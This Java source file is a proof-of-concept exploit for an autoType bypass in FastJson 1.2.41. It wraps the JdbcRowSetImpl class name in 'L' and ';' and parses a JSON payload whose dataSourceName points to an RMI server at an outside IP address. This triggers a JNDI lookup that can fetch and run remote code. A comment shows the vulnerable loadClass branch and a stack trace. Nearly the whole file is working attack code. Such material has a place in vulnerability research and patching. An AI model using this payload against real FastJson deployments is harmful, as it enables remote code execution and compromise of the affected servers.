import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.rowset.JdbcRowSetImpl;

public class Bypass_1241_PoC {
    public static void main(String[] args) throws Exception {
        System.out.println("[+] ByPass FastJson 1.2.41 JNDI PoC");
        // First, we should manually set autoTypeSupport
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // And then, just put `L` before and `;` after :)
        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://192.168.37.134:1099/fwxpdq\", \"autoCommit\":true}";
        JSON.parse(payload);
        /*
In TypeUtil#loadClass:
            } else if (className.startsWith("L") && className.endsWith(";")) { // <===============
                String newClassName = className.substring(1, className.length() - 1);
                return loadClass(newClassName, classLoader);

loadClass:1142, TypeUtils (com.alibaba.fastjson.util)
checkAutoType:926, ParserConfig (com.alibaba.fastjson.parser)
parseObject:308, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1335, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1301, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:152, JSON (com.alibaba.fastjson)
parse:162, JSON (com.alibaba.fastjson)
parse:131, JSON (com.alibaba.fastjson)
main:12, Bypass_1241_PoC
         */
    }
}
